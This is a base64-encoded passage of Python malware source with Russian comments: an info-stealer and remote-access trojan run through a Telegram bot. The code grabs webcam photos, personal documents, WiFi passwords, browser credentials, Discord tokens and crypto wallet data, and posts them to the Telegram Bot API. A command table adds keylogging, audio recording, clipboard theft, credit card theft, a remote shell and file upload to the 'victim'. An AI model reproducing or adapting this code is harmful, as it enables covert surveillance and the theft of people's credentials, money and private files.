ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJzc2lkIjogcHJvZmlsZSwgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInBhc3N3b3JkIjogcGFzc3dvcmRbMF0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OiAKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICBleGNlcHQ6IAogICAgICAgICAgICBwYXNzCgogICAgZGVmIHN0ZWFsX2NhbWVyYV9waG90b3Moc2VsZiwgY291bnQ9NSk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBjYXAgPSBjdjIuVmlkZW9DYXB0dXJlKDApCiAgICAgICAgICAgIHBob3RvcyA9IFtdCiAgICAgICAgICAgIGZvciBpIGluIHJhbmdlKGNvdW50KToKICAgICAgICAgICAgICAgIHJldCwgZnJhbWUgPSBjYXAucmVhZCgpCiAgICAgICAgICAgICAgICBpZiByZXQ6CiAgICAgICAgICAgICAgICAgICAgXywgYnVmZmVyID0gY3YyLmltZW5jb2RlKCcuanBnJywgZnJhbWUpCiAgICAgICAgICAgICAgICAgICAgcGhvdG9zLmFwcGVuZChiYXNlNjQuYjY0ZW5jb2RlKGJ1ZmZlcikuZGVjb2RlKCkpCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDAuNSkKICAgICAgICAgICAgY2FwLnJlbGVhc2UoKQogICAgICAgICAgICByZXR1cm4gcGhvdG9zCiAgICAgICAgZXhjZXB0OiAKICAgICAgICAgICAgcmV0dXJuIFtdCgogICAgZGVmIHN0ZWFsX2RvY3VtZW50cyhzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGRvY3VtZW50cyA9IFtdCiAgICAgICAgICAgIGZvbGRlcnMgPSBbCiAgICAgICAgICAgICAgICBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSwgJ0Rlc2t0b3AnKSwKICAgICAgICAgICAgICAgIG9zLnBhdGguam9pbihvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddLCAnRG9jdW1lbnRzJyksCiAgICAgICAgICAgICAgICBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSwgJ0Rvd25sb2FkcycpLAogICAgICAgICAgICAgICAgb3MucGF0aC5qb2luKG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ10sICdQaWN0dXJlcycpLAogICAgICAgICAgICBdCiAgICAgICAgICAgIAogICAgICAgICAgICBmb3IgZm9sZGVyIGluIGZvbGRlcnM6CiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhmb2xkZXIpOgogICAgICAgICAgICAgICAgICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKGZvbGRlcik6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBmaWxlIGluIGZpbGVzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgYW55KGZpbGUubG93ZXIoKS5lbmRzd2l0aChleHQpIGZvciBleHQgaW4gWycudHh0JywgJy5kb2MnLCAnLmRvY3gnLCAnLnBkZicsICcueGxzJywgJy54bHN4JywgJy5qcGcnLCAnLmpwZWcnLCAnLnBuZyddKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyYicpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50ID0gZi5yZWFkKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnRzLmFwcGVuZCh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZSc6IGZpbGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAncGF0aCc6IGZpbGVfcGF0aCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdzaXplJzogbGVuKGNvbnRlbnQpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NvbnRlbnQnOiBiYXNlNjQuYjY0ZW5jb2RlKGNvbnRlbnQpLmRlY29kZSgpWzo1MDAwMF0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgIHJldHVybiBkb2N1bWVudHMKICAgICAgICBleGNlcHQ6IAogICAgICAgICAgICByZXR1cm4gW10KCiAgICBkZWYgY3JlYXRlX3N5c3RlbV9yZXBvcnQoc2VsZik6CiAgICAgICAgIiIi0KHQvtC30LTQsNC10YIg0L/QvtC70L3Ri9C5INC+0YLRh9C10YIg0L4g0YHQuNGB0YLQtdC80LUiIiIKICAgICAgICByZXBvcnQgPSBmIiIiCj09PSDQn9Ce0JvQndCr0Jkg0KHQmNCh0KLQldCc0J3Qq9CZINCe0KLQp9CV0KIgPT09CtCS0YDQtdC80Y86IHtkYXRldGltZS5kYXRldGltZS5ub3coKX0K0J/QvtC70YzQt9C+0LLQsNGC0LXQu9GMOiB7Z2V0cGFzcy5nZXR1c2VyKCl9CtCa0L7QvNC/0YzRjtGC0LXRgDoge3BsYXRmb3JtLm5vZGUoKX0K0J7QoToge3BsYXRmb3JtLnN5c3RlbSgpfSB7cGxhdGZvcm0ucmVsZWFzZSgpfQoKPT09INCQ0J/Qn9CQ0KDQkNCi0J3QntCVINCe0JHQldCh0J/QldCn0JXQndCY0JUgPT09CtCf0YDQvtGG0LXRgdGB0L7RgDoge3BsYXRmb3JtLnByb2Nlc3NvcigpfQrQntC/0LXRgNCw0YLQuNCy0L3QsNGPINC/0LDQvNGP0YLRjDoge3NlbGYuZGF0YVsnc3lzdGVtX2luZm8nXS5nZXQoJ3JhbScsICdVbmtub3duJyl9CtCS0LjQtNC10L7QutCw0YDRgtCwOiB7JywgJy5qb2luKHNlbGYuZGF0YVsnc3lzdGVtX2luZm8nXS5nZXQoJ2dwdScsIFtdKSl9CtCU0LjRgdC60Lg6IHsnLCAnLmpvaW4oc2VsZi5kYXRhWydzeXN0ZW1faW5mbyddLmdldCgnZGlza3MnLCBbXSkpfQoKPT09INCh0JXQotCsID09PQrQm9C+0LrQsNC70YzQvdGL0LkgSVA6IHtzZWxmLmRhdGFbJ3N5c3RlbV9pbmZvJ10uZ2V0KCdpcF9sb2NhbCcsICdVbmtub3duJyl9CtCS0L3QtdGI0L3QuNC5IElQOiB7c2VsZi5kYXRhWydzeXN0ZW1faW5mbyddLmdldCgnaXBfZXh0ZXJuYWwnLCAnVW5rbm93bicpfQoKPT09INCR0JXQl9Ce0J/QkNCh0J3QntCh0KLQrCA9PT0K0JDQvdGC0LjQstC40YDRg9GBOiB7JywgJy5qb2luKHNlbGYuZGF0YVsnc3lzdGVtX2luZm8nXS5nZXQoJ2FudGl2aXJ1cycsIFtdKSl9Cgo9PT0g0J3QkNCZ0JTQldCd0J3Qq9CVINCU0JDQndCd0KvQlSA9PT0K0J/QsNGA0L7Qu9C4OiB7bGVuKHNlbGYuZGF0YVsncGFzc3dvcmRzJ10pfQpDb29raWVzOiB7bGVuKHNlbGYuZGF0YVsnY29va2llcyddKX0KV2lGaSDRgdC10YLQtdC5OiB7bGVuKHNlbGYuZGF0YVsnd2lmaV9wYXNzd29yZHMnXSl9ClRlbGVncmFtINGB0LXRgdGB0LjQuToge2xlbihzZWxmLmRhdGFbJ3RlbGVncmFtX3Nlc3Npb25zJ10pfQpEaXNjb3JkINGC0L7QutC10L3QvtCyOiB7bGVuKHNlbGYuZGF0YVsnZGlzY29yZF90b2tlbnMnXSl9CtCa0YDQuNC/0YLQvi3QutC+0YjQtdC70YzQutC+0LI6IHtsZW4oc2VsZi5kYXRhWydjcnlwdG9fd2FsbGV0cyddKSArIGxlbihzZWxmLmRhdGFbJ21ldGFtYXNrX2RhdGEnXSl9CiAgICAgICAgIiIiCiAgICAgICAgcmV0dXJuIHJlcG9ydAoKICAgIGRlZiBzZW5kX3RvX3RlbGVncmFtKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgIyDQntGC0L/RgNCw0LLQu9GP0LXQvCDQvtGB0L3QvtCy0L3QvtC5INC+0YLRh9C10YIKICAgICAgICAgICAgcmVwb3J0ID0gc2VsZi5jcmVhdGVfc3lzdGVtX3JlcG9ydCgpCiAgICAgICAgICAgIHJlcXVlc3RzLnBvc3QoZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RFTEVHUkFNX0JPVF9UT0tFTn0vc2VuZE1lc3NhZ2UiLCAKICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE9eyJjaGF0X2lkIjogVEVMRUdSQU1fQ0hBVF9JRCwgInRleHQiOiBmImBgYHtyZXBvcnR9YGBgIiwgInBhcnNlX21vZGUiOiAiTWFya2Rvd24ifSkKICAgICAgICAgICAgCiAgICAgICAgICAgICMg0J7RgtC/0YDQsNCy0LvRj9C10Lwg0L/QsNGA0L7Qu9C4CiAgICAgICAgICAgIGlmIHNlbGYuZGF0YVsicGFzc3dvcmRzIl06CiAgICAgICAgICAgICAgICBwYXNzd29yZHNfdGV4dCA9ICIq8J+UkSDQndCQ0JnQlNCV0J3QndCr0JUg0J/QkNCg0J7Qm9CYOipcXFxcblxcXFxuIgogICAgICAgICAgICAgICAgZm9yIHB3ZCBpbiBzZWxmLmRhdGFbInBhc3N3b3JkcyJdWzoxMF06CiAgICAgICAgICAgICAgICAgICAgcGFzc3dvcmRzX3RleHQgKz0gZiIqe3B3ZFsnYnJvd3NlciddfToqXFxcXG7wn4yQIHtwd2RbJ3VybCddfVxcXFxu8J+RpCB7cHdkWyd1c2VybmFtZSddfVxcXFxu8J+UkCB7cHdkWydwYXNzd29yZCddfVxcXFxuXFxcXG4iCiAgICAgICAgICAgICAgICByZXF1ZXN0cy5wb3N0KGYiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtURUxFR1JBTV9CT1RfVE9LRU59L3NlbmRNZXNzYWdlIiwgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YT17ImNoYXRfaWQiOiBURUxFR1JBTV9DSEFUX0lELCAidGV4dCI6IHBhc3N3b3Jkc190ZXh0Wzo0MDAwXSwgInBhcnNlX21vZGUiOiAiTWFya2Rvd24ifSkKCiAgICAgICAgICAgICMg0J7RgtC/0YDQsNCy0LvRj9C10Lwg0YHQutGA0LjQvdGI0L7RggogICAgICAgICAgICBpZiBzZWxmLmRhdGFbInNjcmVlbnNob3RzIl06CiAgICAgICAgICAgICAgICByZXF1ZXN0cy5wb3N0KGYiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtURUxFR1JBTV9CT1RfVE9LRU59L3NlbmRQaG90byIsIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE9eyJjaGF0X2lkIjogVEVMRUdSQU1fQ0hBVF9JRH0sIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVzPXsicGhvdG8iOiAoInNjcmVlbnNob3QucG5nIiwgYmFzZTY0LmI2NGRlY29kZShzZWxmLmRhdGFbInNjcmVlbnNob3RzIl1bMF0pKX0pCgogICAgICAgICAgICAjINCe0YLQv9GA0LDQstC70Y/QtdC8IFdpRmkg0L/QsNGA0L7Qu9C4CiAgICAgICAgICAgIGlmIHNlbGYuZGF0YVsid2lmaV9wYXNzd29yZHMiXToKICAgICAgICAgICAgICAgIHdpZmlfdGV4dCA9ICIq8J+TtiBXaUZpINCf0JDQoNCe0JvQmDoqXFxcXG5cXFxcbiIKICAgICAgICAgICAgICAgIGZvciB3aWZpIGluIHNlbGYuZGF0YVsid2lmaV9wYXNzd29yZHMiXToKICAgICAgICAgICAgICAgICAgICB3aWZpX3RleHQgKz0gZiIqe3dpZmlbJ3NzaWQnXX0qIC0gYHt3aWZpWydwYXNzd29yZCddfWBcXFxcbiIKICAgICAgICAgICAgICAgIHJlcXVlc3RzLnBvc3QoZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RFTEVHUkFNX0JPVF9UT0tFTn0vc2VuZE1lc3NhZ2UiLCAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhPXsiY2hhdF9pZCI6IFRFTEVHUkFNX0NIQVRfSUQsICJ0ZXh0Ijogd2lmaV90ZXh0LCAicGFyc2VfbW9kZSI6ICJNYXJrZG93biJ9KQoKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHByaW50KGYi0J7RiNC40LHQutCwINC+0YLQv9GA0LDQstC60Lgg0LIgVGVsZWdyYW06IHtlfSIpCgogICAgZGVmIHJ1bihzZWxmKToKICAgICAgICBzZWxmLnN0ZWFsX3N5c3RlbV9pbmZvKCkKICAgICAgICBzZWxmLnN0ZWFsX2FsbF9icm93c2VycygpCiAgICAgICAgc2VsZi5zdGVhbF9jb29raWVzKCkKICAgICAgICBzZWxmLnN0ZWFsX3RlbGVncmFtX3Nlc3Npb25zKCkKICAgICAgICBzZWxmLnN0ZWFsX2Rpc2NvcmRfdG9rZW5zKCkKICAgICAgICBzZWxmLnN0ZWFsX2NyeXB0b193YWxsZXRzKCkKICAgICAgICBzZWxmLmdldF93aWZpX3Bhc3N3b3JkcygpCiAgICAgICAgc2VsZi50YWtlX3NjcmVlbnNob3QoKQogICAgICAgIHNlbGYuc2VuZF90b190ZWxlZ3JhbSgpCgpjbGFzcyBUZWxlZ3JhbUNvbnRyb2xsZXI6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5sYXN0X3VwZGF0ZV9pZCA9IDAKICAgICAgICBzZWxmLmtleWxvZ2dlciA9IEtleUxvZ2dlcigpCiAgICAgICAgc2VsZi5tb3VzZV9sb2dnZXIgPSBNb3VzZUxvZ2dlcigpCiAgICAgICAgc2VsZi5hdWRpb19yZWNvcmRlciA9IEF1ZGlvUmVjb3JkZXIoKQogICAgICAgIHNlbGYuY2xpcGJvYXJkX3N0ZWFsZXIgPSBDbGlwYm9hcmRTdGVhbGVyKCkKICAgICAgICBzZWxmLmZpbGVfbW9uaXRvciA9IEZpbGVNb25pdG9yKCkKICAgICAgICBzZWxmLnNjcmVlbl9sb2NrZXIgPSBTY3JlZW5Mb2NrZXIoKQogICAgICAgIHNlbGYucHJvY2Vzc19tYW5hZ2VyID0gUHJvY2Vzc01hbmFnZXIoKQogICAgICAgIHNlbGYudXBsb2FkX21vZGUgPSBGYWxzZQogICAgICAgIHNlbGYuZG93bmxvYWRfbW9kZSA9IEZhbHNlCiAgICAgICAgc2VsZi5zaGVsbF9tb2RlID0gRmFsc2UKICAgICAgICBzZWxmLmtpbGxfbW9kZSA9IEZhbHNlCiAgICAgICAgCiAgICAgICAgc2VsZi5jb21tYW5kc19oYW5kbGVycyA9IHsKICAgICAgICAgICAgJ21lbnVfbWFpbic6IHNlbGYuc2VuZF9tYWluX21lbnUsCiAgICAgICAgICAgICdtZW51X3N0ZWFsJzogc2VsZi5zZW5kX3N0ZWFsX21lbnUsCiAgICAgICAgICAgICdtZW51X21vbml0b3InOiBzZWxmLnNlbmRfbW9uaXRvcl9tZW51LAogICAgICAgICAgICAnbWVudV9zeXN0ZW0nOiBzZWxmLnNlbmRfc3lzdGVtX21lbnUsCiAgICAgICAgICAgICdtZW51X2ZpbGVzJzogc2VsZi5zZW5kX2ZpbGVzX21lbnUsCiAgICAgICAgICAgIAogICAgICAgICAgICAnc3RlYWxfcGFzc3dvcmRzJzogc2VsZi5zdGVhbF9wYXNzd29yZHNfY29tbWFuZCwKICAgICAgICAgICAgJ3NjcmVlbnNob3QnOiBzZWxmLnNjcmVlbnNob3RfY29tbWFuZCwKICAgICAgICAgICAgJ3dlYmNhbSc6IHNlbGYud2ViY2FtX2NvbW1hbmQsCiAgICAgICAgICAgICdjYW1lcmFfYnVyc3QnOiBzZWxmLmNhbWVyYV9idXJzdF9jb21tYW5kLAogICAgICAgICAgICAna2V5bG9nZ2VyX3N0YXJ0Jzogc2VsZi5rZXlsb2dnZXJfc3RhcnRfY29tbWFuZCwKICAgICAgICAgICAgJ2tleWxvZ2dlcl9zdG9wJzogc2VsZi5rZXlsb2dnZXJfc3RvcF9jb21tYW5kLAogICAgICAgICAgICAna2V5bG9nZ2VyX2dldCc6IHNlbGYua2V5bG9nZ2VyX2dldF9jb21tYW5kLAogICAgICAgICAgICAnbW91c2Vfc3RhcnQnOiBzZWxmLm1vdXNlX3N0YXJ0X2NvbW1hbmQsCiAgICAgICAgICAgICdtb3VzZV9zdG9wJzogc2VsZi5tb3VzZV9zdG9wX2NvbW1hbmQsCiAgICAgICAgICAgICdtb3VzZV9nZXQnOiBzZWxmLm1vdXNlX2dldF9jb21tYW5kLAogICAgICAgICAgICAnY2xpcGJvYXJkX3N0YXJ0Jzogc2VsZi5jbGlwYm9hcmRfc3RhcnRfY29tbWFuZCwKICAgICAgICAgICAgJ2NsaXBib2FyZF9zdG9wJzogc2VsZi5jbGlwYm9hcmRfc3RvcF9jb21tYW5kLAogICAgICAgICAgICAnY2xpcGJvYXJkX2dldCc6IHNlbGYuY2xpcGJvYXJkX2dldF9jb21tYW5kLAogICAgICAgICAgICAnZmlsZV9tb25pdG9yX3N0YXJ0Jzogc2VsZi5maWxlX21vbml0b3Jfc3RhcnRfY29tbWFuZCwKICAgICAgICAgICAgJ2ZpbGVfbW9uaXRvcl9zdG9wJzogc2VsZi5maWxlX21vbml0b3Jfc3RvcF9jb21tYW5kLAogICAgICAgICAgICAnZmlsZV9tb25pdG9yX2dldCc6IHNlbGYuZmlsZV9tb25pdG9yX2dldF9jb21tYW5kLAogICAgICAgICAgICAnbG9ja19zY3JlZW4nOiBzZWxmLmxvY2tfc2NyZWVuX2NvbW1hbmQsCiAgICAgICAgICAgICdraWxsX3Byb2Nlc3MnOiBzZWxmLmtpbGxfcHJvY2Vzc19jb21tYW5kLAogICAgICAgICAgICAna2lsbF9hY3RpdmVfcHJvY2Vzcyc6IHNlbGYua2lsbF9hY3RpdmVfcHJvY2Vzc19jb21tYW5kLAogICAgICAgICAgICAncHJvY2Vzc19saXN0Jzogc2VsZi5wcm9jZXNzX2xpc3RfY29tbWFuZCwKICAgICAgICAgICAgJ3N5c3RlbV9pbmZvJzogc2VsZi5zeXN0ZW1faW5mb19jb21tYW5kLAogICAgICAgICAgICAnc3lzdGVtX3JlcG9ydCc6IHNlbGYuc3lzdGVtX3JlcG9ydF9jb21tYW5kLAogICAgICAgICAgICAnd2lmaV9wYXNzd29yZHMnOiBzZWxmLndpZmlfcGFzc3dvcmRzX2NvbW1hbmQsCiAgICAgICAgICAgICdzdGVhbF9kb2N1bWVudHMnOiBzZWxmLnN0ZWFsX2RvY3VtZW50c19jb21tYW5kLAogICAgICAgICAgICAnc3RlYWxfdGVsZWdyYW0nOiBzZWxmLnN0ZWFsX3RlbGVncmFtX2NvbW1hbmQsCiAgICAgICAgICAgICdzdGVhbF9kaXNjb3JkJzogc2VsZi5zdGVhbF9kaXNjb3JkX2NvbW1hbmQsCiAgICAgICAgICAgICdzdGVhbF9jcnlwdG8nOiBzZWxmLnN0ZWFsX2NyeXB0b19jb21tYW5kLAogICAgICAgICAgICAnYnJvd3Nlcl9oaXN0b3J5Jzogc2VsZi5icm93c2VyX2hpc3RvcnlfY29tbWFuZCwKICAgICAgICAgICAgJ2NyZWRpdF9jYXJkcyc6IHNlbGYuY3JlZGl0X2NhcmRzX2NvbW1hbmQsCiAgICAgICAgICAgICdzaGVsbCc6IHNlbGYuc2hlbGxfY29tbWFuZCwKICAgICAgICAgICAgJ2Rvd25sb2FkX2ZpbGUnOiBzZWxmLmRvd25sb2FkX2ZpbGVfY29tbWFuZCwKICAgICAgICAgICAgJ3VwbG9hZF9maWxlJzogc2VsZi51cGxvYWRfZmlsZV9jb21tYW5kLAogICAgICAgICAgICAnYXVkaW9fc3RhcnQnOiBzZWxmLmF1ZGlvX3N0YXJ0X2NvbW1hbmQsCiAgICAgICAgICAgICdhdWRpb19zdG9wJzogc2VsZi5hdWRpb19zdG9wX2NvbW1hbmQsCiAgICAgICAgICAgICdhdWRpb19nZXQnOiBzZWxmLmF1ZGlvX2dldF9jb21tYW5kLAogICAgICAgICAgICAnZnVsbF9zY2FuJzogc2VsZi5mdWxsX3NjYW5fY29tbWFuZCwKICAgICAgICAgICAgJ3N0b3BfYWxsJzogc2VsZi5zdG9wX2FsbF9jb21tYW5kLAogICAgICAgICAgICAnc3RvcF92aXJ1cyc6IHNlbGYuc3RvcF92aXJ1c19jb21tYW5kCiAgICAgICAgfQoKICAgIGRlZiBzZW5kX21lc3NhZ2Uoc2VsZiwgdGV4dCwgcmVwbHlfbWFya3VwPU5vbmUpOgogICAgICAgIHRyeToKICAgICAgICAgICAgZGF0YSA9IHsiY2hhdF9pZCI6IFRFTEVHUkFNX0NIQVRfSUQsICJ0ZXh0IjogdGV4dCwgInBhcnNlX21vZGUiOiAiTWFya2Rvd24ifQogICAgICAgICAgICBpZiByZXBseV9tYXJrdXA6IAogICAgICAgICAgICAgICAgZGF0YVsicmVwbHlfbWFya3VwIl0gPSBqc29uLmR1bXBzKHJlcGx5X21hcmt1cCkKICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KGYiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtURUxFR1JBTV9CT1RfVE9LRU59L3NlbmRNZXNzYWdlIiwgZGF0YT1kYXRhLCB0aW1lb3V0PTEwKQogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwcmludChmItCe0YjQuNCx0LrQsCDQvtGC0L/RgNCw0LLQutC4INGB0L7QvtCx0YnQtdC90LjRjzoge2V9IikKICAgICAgICAgICAgcmV0dXJuIEZhbHNlCgogICAgZGVmIHNlbmRfcGhvdG8oc2VsZiwgcGhvdG9fZGF0YSwgY2FwdGlvbj0iIik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RFTEVHUkFNX0JPVF9UT0tFTn0vc2VuZFBob3RvIiwKICAgICAgICAgICAgICAgIGZpbGVzPXsicGhvdG8iOiAoInBob3RvLmpwZyIsIHBob3RvX2RhdGEpfSwgCiAgICAgICAgICAgICAgICBkYXRhPXsiY2hhdF9pZCI6IFRFTEVHUkFNX0NIQVRfSUQsICJjYXB0aW9uIjogY2FwdGlvbn0sCiAgICAgICAgICAgICAgICB0aW1lb3V0PTMwKQogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwcmludChmItCe0YjQuNCx0LrQsCDQvtGC0L/RgNCw0LLQutC4INGE0L7RgtC+OiB7ZX0iKQogICAgICAgICAgICByZXR1cm4gRmFsc2UKCiAgICBkZWYgc2VuZF9kb2N1bWVudChzZWxmLCBmaWxlX2RhdGEsIGZpbGVuYW1lLCBjYXB0aW9uPSIiKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdChmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7VEVMRUdSQU1fQk9UX1RPS0VOfS9zZW5kRG9jdW1lbnQiLAogICAgICAgICAgICAgICAgZmlsZXM9eyJkb2N1bWVudCI6IChmaWxlbmFtZSwgZmlsZV9kYXRhKX0sIAogICAgICAgICAgICAgICAgZGF0YT17ImNoYXRfaWQiOiBURUxFR1JBTV9DSEFUX0lELCAiY2FwdGlvbiI6IGNhcHRpb259LAogICAgICAgICAgICAgICAgdGltZW91dD0zMCkKICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMAogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoZiLQntGI0LjQsdC60LAg0L7RgtC/0YDQsNCy0LrQuCDQtNC+0LrRg9C80LXQvdGC0LA6IHtlfSIpCiAgICAgICAgICAgIHJldHVybiBGYWxzZQoKICAgIGRlZiBkb3dubG9hZF9maWxlX2Zyb21fdGVsZWdyYW0oc2VsZiwgZmlsZV9pZCk6CiAgICAgICAgIiIi0KHQutCw0YfQuNCy0LDQtdGCINGE0LDQudC7INC40LcgVGVsZWdyYW0iIiIKICAgICAgICB0cnk6CiAgICAgICAgICAgICMg0J/QvtC70YPRh9Cw0LXQvCDQuNC90YTQvtGA0LzQsNGG0LjRjiDQviDRhNCw0LnQu9C1CiAgICAgICAgICAgIGZpbGVfaW5mb191cmwgPSBmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7VEVMRUdSQU1fQk9UX1RPS0VOfS9nZXRGaWxlIgogICAgICAgICAgICBmaWxlX2luZm9fcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KGZpbGVfaW5mb191cmwsIGRhdGE9eyJmaWxlX2lkIjogZmlsZV9pZH0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBmaWxlX2luZm9fcmVzcG9uc2Uuc3RhdHVzX2NvZGUgIT0gMjAwOgogICAgICAgICAgICAgICAgcmV0dXJuIE5vbmUKICAgICAgICAgICAgICAgIAogICAgICAgICAgICBmaWxlX2luZm8gPSBmaWxlX2luZm9fcmVzcG9uc2UuanNvbigpCiAgICAgICAgICAgIGlmIG5vdCBmaWxlX2luZm8uZ2V0KCJvayIpOgogICAgICAgICAgICAgICAgcmV0dXJuIE5vbmUKICAgICAgICAgICAgICAgIAogICAgICAgICAgICBmaWxlX3BhdGggPSBmaWxlX2luZm9bInJlc3VsdCJdWyJmaWxlX3BhdGgiXQogICAgICAgICAgICAKICAgICAgICAgICAgIyDQodC60LDRh9C40LLQsNC10Lwg0YTQsNC50LsKICAgICAgICAgICAgZG93bmxvYWRfdXJsID0gZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvZmlsZS9ib3R7VEVMRUdSQU1fQk9UX1RPS0VOfS97ZmlsZV9wYXRofSIKICAgICAgICAgICAgZmlsZV9yZXNwb25zZSA9IHJlcXVlc3RzLmdldChkb3dubG9hZF91cmwsIHRpbWVvdXQ9MzApCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBmaWxlX3Jlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgIHJldHVybiBmaWxlX3Jlc3BvbnNlLmNvbnRlbnQKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJldHVybiBOb25lCiAgICAgICAgICAgICAgICAKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHByaW50KGYi0J7RiNC40LHQutCwINGB0LrQsNGH0LjQstCw0L3QuNGPINGE0LDQudC70LA6IHtlfSIpCiAgICAgICAgICAgIHJldHVybiBOb25lCgogICAgZGVmIHVwbG9hZF9maWxlX3RvX3ZpY3RpbShzZWxmLCBmaWxlX2NvbnRlbnQsIGZpbGVuYW1lLCB0YXJnZXRfcGF0aD1Ob25lKToKICAgICAgICAiIiLQl9Cw0LPRgNGD0LbQsNC10YIg0YTQsNC50Lsg0L3QsCDQutC+0LzQv9GM0Y7RgtC10YAg0LbQtdGA0YLQstGLIiIiCiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiB0YXJnZXRfcGF0aCBpcyBOb25lOgogICAgICAgICAgICAgICAgIyDQodC+0YXRgNCw0L3Rj9C10Lwg0L3QsCDRgNCw0LHQvtGH0LjQuSDRgdGC0L7QuwogICAgICAgICAgICAgICAgZGVza3RvcCA9IG9zLnBhdGguam9pbihvcy5wYXRoLmV4cGFuZHVzZXIoIn4iKSwgIkRlc2t0b3AiKQogICAgICAgICAgICAgICAgdGFyZ2V0X3BhdGggPSBvcy5wYXRoLmpvaW4oZGVza3RvcCwgZmlsZW5hbWUpCiAgICAgICAgICAgIAogICAgICAgICAgICB3aXRoIG9wZW4odGFyZ2V0X3BhdGgsICd3YicpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKGZpbGVfY29udGVudCkKICAgICAgICAgICAgCiAgICAgICAgICAgIHJldHVybiBUcnVlLCB0YXJnZXRfcGF0aAogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcmV0dXJuIEZhbHNlLCBzdHIoZSkKCiAgICBkZWYgZ2V0X3VwZGF0ZXMoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldChmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7VEVMRUdSQU1fQk9UX1RPS0VOfS9nZXRVcGRhdGVzIiwKICAgICAgICAgICAgICAgIHBhcmFtcz17Im9mZnNldCI6IHNlbGYubGFzdF91cGRhdGVfaWQgKyAxLCAidGltZW91dCI6IDMwfSwgdGltZW91dD0zNSkKICAgI